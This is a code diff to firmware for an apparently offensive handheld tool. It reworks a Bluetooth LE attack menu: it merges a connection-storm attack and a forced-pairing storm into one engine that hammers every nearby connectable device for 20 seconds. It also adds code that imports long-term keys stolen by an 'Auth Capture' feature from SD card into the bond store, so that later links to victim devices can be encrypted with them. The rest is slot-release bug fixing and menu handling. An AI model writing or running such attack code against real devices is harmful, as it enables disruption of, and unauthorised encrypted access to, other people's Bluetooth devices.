@@ -7,6 +7,7 @@
 #include "core/mykeyboard.h"
 #include "core/sd_functions.h"
 #include "core/utils.h"
+#include <host/ble_hs.h>
 #include <host/ble_store.h>
 #include "modules/wifi/countersurv.h"
 #include <Preferences.h>
@@ -53,6 +54,48 @@ void bleAtkResult(const String &title, bool ok, const String &line1, const Strin
     bleAtkWaitKey();
 }
 
+// NimBLE frees a client object in its DISCONNECT event, not in deleteClient().
+// deleteClient() only arms that free and, when its own terminate call fails,
+// gives up without releasing anything. A client dropped while it is still
+// DISCONNECTING therefore keeps one of NimBLE's two connection slots forever,
+// and after two runs every attack dies inside createClient() with "Unable to
+// create client; already at max: 2". Waiting for isConnected() does not cover
+// it: the status turns DISCONNECTING as soon as disconnect() is called, while
+// the handle is still held. Wait for the handle to be handed back instead.
+bool bleAtkWaitDisconnected(NimBLEClient *client, uint32_t ms) {
+    if (client == nullptr) return true;
+    uint32_t end = millis() + ms;
+    while (client->getConnHandle() != BLE_HS_CONN_HANDLE_NONE && (int32_t)(millis() - end) < 0)
+        vTaskDelay(pdMS_TO_TICKS(10));
+    return client->getConnHandle() == BLE_HS_CONN_HANDLE_NONE;
+}
+
+// Self-delete is the only release that cannot race the event: the stack frees
+// the object itself once the link is gone. Never touch `client` after this.
+void bleAtkReleaseClient(NimBLEClient *client) {
+    if (client == nullptr) return;
+    if (bleAtkWaitDisconnected(client, 1500)) {
+        NimBLEDevice::deleteClient(client); // idle already: freed on the spot
+    } else {
+        client->setSelfDelete(true, true);
+        client->disconnect();
+    }
+    // The free happens on the DISCONNECT event, so give it time and report the
+    // slots it left behind - a non-zero count is what wedges the next run.
+    uint32_t end = millis() + 1500;
+    while (NimBLEDevice::getCreatedClientCount() > 0 && (int32_t)(millis() - end) < 0) vTaskDelay(pdMS_TO_TICKS(10));
+    Serial.printf("[BLEATK] client release left=%u\n", (unsigned)NimBLEDevice::getCreatedClientCount());
+}
+
+// A client from an aborted run still holds its slot until its DISCONNECT event
+// arrives; wait for that instead of failing inside createClient().
+void bleAtkWaitClientSlots() {
+    uint32_t end = millis() + 500;
+    while (NimBLEDevice::getCreatedClientCount() > 0 && (int32_t)(millis() - end) < 0) vTaskDelay(pdMS_TO_TICKS(10));
+    if (NimBLEDevice::getCreatedClientCount() > 0)
+        Serial.printf("[BLEATK] stale client slots=%u\n", (unsigned)NimBLEDevice::getCreatedClientCount());
+}
+
 // Run an active scan and return the addresses that advertised connectable.
 // The results object is owned by the scan; copy only the NimBLEAddress values
 // (small, value type) before clearResults().
@@ -83,66 +126,6 @@ std::vector<NimBLEAddress> bleAtkScanConnectable(uint32_t ms, String &error) {
     }
     scan->clearResults();
     return out;
-}
-
-void bleAtkConnectionStorm() {
-    Serial.println("[BLEATK] storm start");
-    bleAtkClearKeys();
-    bleAtkStatus("Connection Storm", "Scanning 6s...", "connectable advertisers");
-
-    String error;
-    std::vector<NimBLEAddress> targets = bleAtkScanConnectable(6000, error);
-    Serial.printf("[BLEATK] storm scan targets=%u err=%s\n", (unsigned)targets.size(), error.c_str());
-    if (targets.empty()) {
-        stopBLEStack();
-        bleAtkResult("Connection Storm", false, error.length() ? error : "No connectable BLE devices", "");
-        return;
-    }
-
-    uint32_t start = millis();
-    uint32_t end = start + 20000;
-    uint32_t attempts = 0, connected = 0, lastPaint = 0;
-    // Reuse one client. Creating/deleting a client for every attempt leaves the
-    // old client in DISCONNECTING until the stack callback runs, and two stale
-    // clients exhaust NimBLE's connection slots (the old "already at max: 2").
-    NimBLEClient *client = NimBLEDevice::createClient();
-    if (client == nullptr) {
-        stopBLEStack();
-        bleAtkResult("Connection Storm", false, "Client allocation failed", "");
-        return;
-    }
-    while ((int32_t)(millis() - end) < 0 && !EscPress) {
-        for (auto &addr : targets) {
-            if (EscPress) break;
-            client->setConnectTimeout(1200);
-            client->setConnectionParams(6, 6, 0, 100);
-            if (client->connect(addr, false)) {
-                connected++;
-                client->disconnect();
-                uint32_t wait = millis() + 1000;
-                while (client->isConnected() && millis() < wait) vTaskDelay(pdMS_TO_TICKS(10));
-            }
-            attempts++;
-        }
-
-        if (millis() - lastPaint >= 400) {
-            lastPaint = millis();
-            tft.fillRect(8, 80, tftWidth - 16, 34, bruceConfig.bgColor);
-            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-            tft.drawString(String("Targets: ") + String(targets.size()), 10, 80);
-            tft.drawString(String("Attempts: ") + String(attempts) + "  Links: " + String(connected), 10, 98);
-        }
-        vTaskDelay(pdMS_TO_TICKS(1));
-    }
-
-    NimBLEDevice::deleteClient(client);
-    stopBLEStack();
-    Serial.printf("[BLEATK] storm targets=%u attempts=%u links=%u\n", (unsigned)targets.size(), attempts, connected);
-    bleAtkResult(
-        "Connection Storm", attempts > 0,
-        String("Attempts: ") + String(attempts),
-        String("Connected: ") + String(connected) + " / " + String(targets.size()) + " devices"
-    );
 }
 
 // Same idea as WiFi > Beacon SPAM, but the beacon is a BLE advertising name.
@@ -426,6 +409,75 @@ bool bleAuthWriteFile(
     return true;
 }
 
+bool bleHexToBytes(const String &hex, uint8_t *out, size_t len) {
+    if (hex.length() < len * 2) return false;
+    for (size_t i = 0; i < len; i++) {
+        char b[3] = {hex[2 * i], hex[2 * i + 1], 0};
+        out[i] = (uint8_t)strtoul(b, nullptr, 16);
+    }
+    return true;
+}
+
+// A peer bond is what a central uses to encrypt a link. Key by the advertised
+// address first, then by the other address type, as the bond store does.
+bool bleStormHasBond(const NimBLEAddress &address) {
+    ble_store_key_sec key = {};
+    key.idx = 0;
+    key.peer_addr = *address.getBase();
+    ble_store_value_sec sec = {};
+    if (ble_store_read_peer_sec(&key, &sec) == 0) return true;
+    key.peer_addr.type = key.peer_addr.type == BLE_ADDR_PUBLIC ? BLE_ADDR_RANDOM : BLE_ADDR_PUBLIC;
+    return ble_store_read_peer_sec(&key, &sec) == 0;
+}
+
+// Read /BruceBLE/auth_<addr>.key (written by Auth Capture) back into the bond
+// store. The LTK is required to encrypt; IRK/CSRK are restored when present.
+bool bleAuthImportFile(const NimBLEAddress &address) {
+    if (!setupSdCard()) return false;
+    File f = SD.open(bleAuthFileName(address.toString().c_str()), FILE_READ);
+    if (!f) return false;
+
+    String ltk, irk, csrk;
+    bool ltkPresent = false, irkPresent = false, csrkPresent = false, authenticated = false, sc = false;
+    uint16_t ediv = 0;
+    uint64_t randNum = 0;
+    uint8_t keySize = 16;
+    while (f.available()) {
+        String line = f.readStringUntil('\n');
+        line.trim();
+        int eq = line.indexOf('=');
+        if (eq <= 0) continue;
+        String field = line.substring(0, eq);
+        String value = line.substring(eq + 1);
+        if (field == "ltk") ltk = value;
+        else if (field == "irk") irk = value;
+        else if (field == "csrk") csrk = value;
+        else if (field == "ltk_present") ltkPresent = value == "1";
+        else if (field == "irk_present") irkPresent = value == "1";
+        else if (field == "csrk_present") csrkPresent = value == "1";
+        else if (field == "ediv") ediv = (uint16_t)strtoul(value.c_str(), nullptr, 16);
+        else if (field == "rand") randNum = strtoull(value.c_str(), nullptr, 16);
+        else if (field == "key_size") keySize = (uint8_t)value.toInt();
+        else if (field == "authenticated") authenticated = value == "1";
+        else if (field == "secure_connections") sc = value == "1";
+    }
+    f.close();
+    if (!ltkPresent) return false;
+
+    ble_store_value_sec sec = {};
+    sec.peer_addr = *address.getBase();
+    sec.key_size = keySize;
+    sec.ediv = ediv;
+    sec.rand_num = randNum;
+    sec.authenticated = authenticated;
+    sec.sc = sc;
+    sec.ltk_present = 1;
+    if (!bleHexToBytes(ltk, sec.ltk, 16)) return false;
+    if (irkPresent && bleHexToBytes(irk, sec.irk, 16)) sec.irk_present = 1;
+    if (csrkPresent && bleHexToBytes(csrk, sec.csrk, 16)) sec.csrk_present = 1;
+    return ble_store_write_peer_sec(&sec) == 0;
+}
+
 std::vector<BleAuthTarget> bleAtkScanTargets(uint32_t ms, String &error) {
     std::vector<BleAuthTarget> out;
     error = "";
@@ -500,6 +552,7 @@ void bleAtkAuthCapture() {
     NimBLEDevice::setSecurityAuth(true, false, false);
     NimBLEDevice::setSecurityIOCap(BLE_HS_IO_NO_INPUT_OUTPUT);
 
+    bleAtkWaitClientSlots();
     NimBLEClient *client = NimBLEDevice::createClient();
     if (client == nullptr) {
         stopBLEStack();
@@ -547,7 +600,7 @@ void bleAtkAuthCapture() {
         break;
     }
 
-    NimBLEDevice::deleteClient(client);
+    bleAtkReleaseClient(client);
     stopBLEStack();
     Serial.printf(
         "[BLEATK] auth capture done linked=%d captured=%d name=%s\n", linked, captured, chosen.name.c_str()
@@ -561,23 +614,60 @@ void bleAtkAuthCapture() {
     }
 }
 
-void bleAtkPairingStorm() {
-    Serial.println("[BLEATK] pairing start");
+// One storm engine, two modes. `pair == false` is the old Connection Storm:
+// link and drop. `pair == true` adds a synchronous security request per link.
+// Before the loop it also reuses auth already on the board - a bond in the
+// NimBLE store, or a /BruceBLE/auth_*.key file written by Auth Capture - so a
+// known device can be encrypted with its stored LTK instead of being asked to
+// pair from scratch.
+void bleAtkStorm(bool pair) {
+    Serial.printf("[BLEATK] %s start\n", pair ? "pairing" : "storm");
     bleAtkClearKeys();
     bleAtkStatus("Pairing Storm", "Scanning 6s...", "connectable advertisers");
 
     String error;
     std::vector<NimBLEAddress> targets = bleAtkScanConnectable(6000, error);
-    Serial.printf("[BLEATK] pairing scan targets=%u err=%s\n", (unsigned)targets.size(), error.c_str());
+    Serial.printf(
+        "[BLEATK] %s scan targets=%u err=%s\n", pair ? "pairing" : "storm", (unsigned)targets.size(),
+        error.c_str()
+    );
     if (targets.empty()) {
         stopBLEStack();
         bleAtkResult("Pairing Storm", false, error.length() ? error : "No connectable BLE devices", "");
         return;
     }
 
-    const uint32_t start = millis();
-    const uint32_t end = start + 20000;
+    uint32_t known = 0, imported = 0;
+    if (pair) {
+        // Stored auth is opt-in per device: a bond the board already holds, or
+        // the key file Auth Capture wrote for it. Importing the file into the
+        // bond store lets the stack encrypt the next link with that LTK.
+        for (auto &addr : targets) {
+            if (bleStormHasBond(addr)) {
+                known++;
+                continue;
+            }
+            if (!bleAuthFileExists(addr.toString().c_str())) continue;
+            known++; // auth is on the card; only a usable LTK can be imported
+            // Say which file-backed target became a bond: without this the path
+            // is silent and `imported=0` cannot be told from `skipped`.
+            bool ok = bleAuthImportFile(addr);
+            if (ok) imported++;
+            Serial.printf("[BLEATK] auth import %s ok=%d\n", addr.toString().c_str(), ok ? 1 : 0);
+        }
+        Serial.printf("[BLEATK] pairing known=%u imported=%u\n", (unsigned)known, (unsigned)imported);
+        NimBLEDevice::setSecurityAuth(true, false, false);
+        NimBLEDevice::setSecurityIOCap(BLE_HS_IO_NO_INPUT_OUTPUT);
+    }
+
+    uint32_t start = millis();
+    uint32_t end = start + 20000;
     uint32_t attempts = 0, links = 0, security = 0, lastPaint = 0;
+    bool stuck = false;
+    // Reuse one client. Creating/deleting a client for every attempt leaves the
+    // old client in DISCONNECTING until the stack callback runs, and two stale
+    // clients exhaust NimBLE's connection slots (the old "already at max: 2").
+    bleAtkWaitClientSlots();
     NimBLEClient *client = NimBLEDevice::createClient();
     if (client == nullptr) {
         stopBLEStack();
@@ -589,41 +679,96 @@ void bleAtkPairingStorm() {
         for (auto &addr : targets) {
             if (EscPress) break;
             client->setConnectTimeout(1200);
-            client->setConnectionParams(12, 12, 0, 400);
+            client->setConnectionParams(pair ? 12 : 6, pair ? 12 : 6, 0, pair ? 400 : 100);
             if (client->connect(addr, false)) {
                 links++;
-                // secureConnection() starts pairing/encryption on the live link.
-                // Some peripherals reject it; that is reported as a failed
-                // pairing attempt rather than as a fabricated success.
-                if (client->secureConnection()) security++;
+                // secureConnection() encrypts with a stored LTK when the peer is
+                // known, and otherwise starts a fresh pairing. Devices that
+                // refuse either are counted as links, never as pairing wins.
+                if (pair && client->secureConnection()) security++;
                 client->disconnect();
-                uint32_t wait = millis() + 1000;
-                while (client->isConnected() && millis() < wait) vTaskDelay(pdMS_TO_TICKS(10));
+                // Reuse needs the previous link fully closed, or the next connect
+                // is refused with "Already attempting to connect".
+                if (!bleAtkWaitDisconnected(client, 1000)) {
+                    Serial.println("[BLEATK] link did not close; ending this run");
+                    stuck = true;
+                    break;
+                }
             }
             attempts++;
         }
+        if (stuck) break;
 
         if (millis() - lastPaint >= 400) {
             lastPaint = millis();
             tft.fillRect(8, 80, tftWidth - 16, 34, bruceConfig.bgColor);
             tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-            tft.drawString(String("Targets: ") + String(targets.size()), 10, 80);
-            tft.drawString(String("Pair requests: ") + String(security) + "  Links: " + String(links), 10, 98);
+            tft.drawString(
+                String("Targets: ") + String(targets.size()) + (pair ? "  Known: " + String(known) : ""), 10, 80
+            );
+            if (pair)
+                tft.drawString(String("Pair requests: ") + String(security) + "  Links: " + String(links), 10, 98);
+            else
+                tft.drawString(String("Attempts: ") + String(attempts) + "  Links: " + String(links), 10, 98);
         }
         vTaskDelay(pdMS_TO_TICKS(1));
     }
 
-    NimBLEDevice::deleteClient(client);
+    bleAtkReleaseClient(client);
     stopBLEStack();
-    Serial.printf(
-        "[BLEATK] pairing targets=%u attempts=%u links=%u security=%u\n", (unsigned)targets.size(), attempts,
-        links, security
-    );
-    bleAtkResult(
-        "Pairing Storm", links > 0,
-        String("Links: ") + String(links) + "  Pairing: " + String(security),
-        String("Attempts: ") + String(attempts) + " / " + String(targets.size()) + " devices"
-    );
+    if (pair) {
+        Serial.printf(
+            "[BLEATK] pairing targets=%u attempts=%u links=%u security=%u known=%u\n", (unsigned)targets.size(),
+            (unsigned)attempts, (unsigned)links, (unsigned)security, (unsigned)known
+        );
+        bleAtkResult(
+            "Pairing Storm", links > 0,
+            String("Links: ") + String(links) + "  Pairing: " + String(security),
+            String("Known: ") + String(known) + "  Attempts: " + String(attempts)
+        );
+    } else {
+        Serial.printf(
+            "[BLEATK] storm targets=%u attempts=%u links=%u\n", (unsigned)targets.size(), (unsigned)attempts,
+            (unsigned)links
+        );
+        bleAtkResult(
+            "Pairing Storm", attempts > 0, String("Attempts: ") + String(attempts),
+            String("Connected: ") + String(links) + " / " + String(targets.size()) + " devices"
+        );
+    }
+}
+
+// One row on BLE Atks: the page behind it starts the attack and owns the mode
+// toggle, so the list no longer needs a separate Connection Storm row.
+void bleAtkStormMenu() {
+    static bool pairMode = true;
+    static int last = 0;
+    for (;;) {
+        bool start = false;
+        options = {
+            {"Start Attack", [&]() { start = true; }},
+            {String("Mode: ") + (pairMode ? "connect + pair" : "connect only"),
+             []() { pairMode = !pairMode; }},
+        };
+        addOptionToMainMenu();
+        if (last >= (int)options.size()) last = 0;
+        int sel = loopOptions(options, MENU_TYPE_SUBMENU, "Pairing Storm", last);
+        if (sel < 0) break;
+        if (sel == (int)options.size() - 1) { // Main Menu row
+            returnToMenu = true;
+            break;
+        }
+        // The serial console sets returnToMenu on every command; a page row
+        // must not close just because the console touched the menu. Only the
+        // Main Menu row above and BACK (sel < 0) leave this page.
+        returnToMenu = false;
+        last = sel;
+        if (!start) continue; // mode row: redraw with the new label
+        bleAtkStorm(pairMode);
+        last = 0;            // next open starts on Start Attack
+        returnToMenu = false; // stay on BLE Atks after the run, even from the console
+        break;
+    }
 }
 
 } // namespace
@@ -637,22 +782,30 @@ void BleAttacksMenu() {
     static bool pageRan;
     for (;;) {
         pageRan = false;
+        // The serial console sets returnToMenu on every command it runs, so a
+        // page opened from the console arrives with it already set and the
+        // first row that opens a child menu (BLE Flood's picker) closed again
+        // immediately. Clearing it here is the page's own decision to stay
+        // open, exactly like the Pairing Storm loop below; BACK and the Main
+        // Menu row still leave through returnToMenu.
+        returnToMenu = false;
         options = {
             {"BLE Cadence", []() { pageRan = true; CounterSurv::blePage(); }        },
-            {"Connection Storm", []() { pageRan = true; bleAtkConnectionStorm(); }  },
+            {"Pairing Storm", []() { pageRan = true; bleAtkStormMenu(); }           },
             {"BLE Flood", []() { pageRan = true; bleAtkFlood(); }                   },
-            {"Pairing Storm", []() { pageRan = true; bleAtkPairingStorm(); }        },
             {"Auth Capture", []() { pageRan = true; bleAtkAuthCapture(); }          },
         };
         addOptionToMainMenu();
         loopOptions(options, MENU_TYPE_REGULAR, "BLE Atks");
-        if (!pageRan || returnToMenu) break;
+        if (!pageRan) break; // BACK and the Main Menu row set no pageRan
+        // A row ran, so stay on this page even though the console set
+        // returnToMenu for the command that opened it - otherwise the attack
+        // that just finished silently kicked the page back one level.
+        returnToMenu = false;
     }
 }
 
-void BleConnectionStorm() { bleAtkConnectionStorm(); }
 void BleFlood() { bleAtkFlood(); }
-void BlePairingStorm() { bleAtkPairingStorm(); }
 void BleAuthCapture() { bleAtkAuthCapture(); }
 
 #endif
